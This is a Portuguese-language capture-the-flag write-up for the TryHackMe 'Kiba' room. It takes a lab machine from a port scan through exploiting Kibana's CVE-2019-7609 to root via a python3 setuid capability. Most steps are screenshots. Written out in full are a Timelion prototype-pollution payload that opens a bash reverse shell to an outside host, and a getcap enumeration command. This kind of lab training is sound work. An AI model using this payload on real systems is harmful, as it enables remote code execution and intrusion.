# Kiba

Link: [https://tryhackme.com/room/kiba](https://tryhackme.com/room/kiba)

IP: 10.10.25.174

Começando por um  portscan (Já havia feito um porém não com todas as portas) 

![Untitled](Kiba%20037c5a3cede34068afbbd6ff3495a10d/Untitled.png)

Na porta 80

![Untitled](Kiba%20037c5a3cede34068afbbd6ff3495a10d/Untitled%201.png)

![Untitled](Kiba%20037c5a3cede34068afbbd6ff3495a10d/Untitled%202.png)

Fazendo um dir fuzzing 

![Untitled](Kiba%20037c5a3cede34068afbbd6ff3495a10d/Untitled%203.png)

![Untitled](Kiba%20037c5a3cede34068afbbd6ff3495a10d/Untitled%204.png)

Na porta 5601

![Untitled](Kiba%20037c5a3cede34068afbbd6ff3495a10d/Untitled%205.png)

Preciso entender antes o que é o Kibana 

![Untitled](Kiba%20037c5a3cede34068afbbd6ff3495a10d/Untitled%206.png)

![Untitled](Kiba%20037c5a3cede34068afbbd6ff3495a10d/Untitled%207.png)

Encontrei um exploit 

[https://github.com/mpgn/CVE-2019-7609](https://github.com/mpgn/CVE-2019-7609)

Uma explicação de como ele funciona

[https://pt-br.tenable.com/blog/cve-2019-7609-exploit-script-available-for-kibana-remote-code-execution-vulnerability](https://pt-br.tenable.com/blog/cve-2019-7609-exploit-script-available-for-kibana-remote-code-execution-vulnerability)

—[https://github.com/LandGrey/CVE-2019-7609/](https://github.com/LandGrey/CVE-2019-7609/)

Acessando a área de execução de código 

![Untitled](Kiba%20037c5a3cede34068afbbd6ff3495a10d/Untitled%208.png)

Payload:

.es(*).props(label.**proto**.env.AAAA='require("child_process").exec("bash -c \'bash -i>& /dev/tcp/10.9.1.38/443 0>&1\'");//')
.props(label.**proto**.env.NODE_OPTIONS='--require /proc/self/environ')

abrir um listener

![Untitled](Kiba%20037c5a3cede34068afbbd6ff3495a10d/Untitled%209.png)

Após inserir o payload no área, e depois é hora de acessar o Canvas 

![Untitled](Kiba%20037c5a3cede34068afbbd6ff3495a10d/Untitled%2010.png)

Li o .bash_history

![Untitled](Kiba%20037c5a3cede34068afbbd6ff3495a10d/Untitled%2011.png)

getcap -r / 2>/dev/null

![Untitled](Kiba%20037c5a3cede34068afbbd6ff3495a10d/Untitled%2012.png)

Esse dando do binario de py tem a capacidade de alterar o uid

Tentei executar comandos pelo binario do python3 que estava ali

![Untitled](Kiba%20037c5a3cede34068afbbd6ff3495a10d/Untitled%2013.png)

Após boas tentativas utilizei esse método na qual altera o uid e então executa o bash 

![Untitled](Kiba%20037c5a3cede34068afbbd6ff3495a10d/Untitled%2014.png)

tive problema por não fechar a aspa simples, mas deu tudo certo

Root na mão !